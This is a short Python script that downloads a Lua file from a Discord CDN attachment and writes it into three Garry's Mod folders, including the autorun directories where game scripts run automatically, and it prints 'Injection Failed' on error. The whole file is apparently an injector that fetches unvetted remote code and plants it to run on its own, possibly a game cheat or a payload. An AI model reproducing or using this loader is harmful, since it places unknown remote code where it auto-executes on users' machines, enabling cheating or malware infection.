import os
import requests


def download(url: str, dest_folder: str):
    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)
    filename = url.split('/')[-1].replace(" ", "_")
    file_path = os.path.join(dest_folder, filename)

    r = requests.get(url, stream=True)
    if r.ok:

        with open(file_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024 * 8):
                if chunk:
                    f.write(chunk)
                    f.flush()
                    os.fsync(f.fileno())
    else:
        print("Injection Failed")

download("https://cdn.discordapp.com/attachments/1023332137052684401/1023332308314501230/craig.lua", dest_folder="C:\\Program Files (x86)\\Steam\\steamapps\\common\\GarrysMod\\garrysmod\\lua\\autorun")
download("https://cdn.discordapp.com/attachments/1023332137052684401/1023332308314501230/craig.lua", dest_folder="C:\\Program Files (x86)\\Steam\\steamapps\\common\\GarrysMod\\garrysmod\\lua\\autorun\\client")
download("https://cdn.discordapp.com/attachments/1023332137052684401/1023332308314501230/craig.lua", dest_folder="C:\\Program Files (x86)\\Steam\\steamapps\\common\\GarrysMod\\garrysmod\\lua")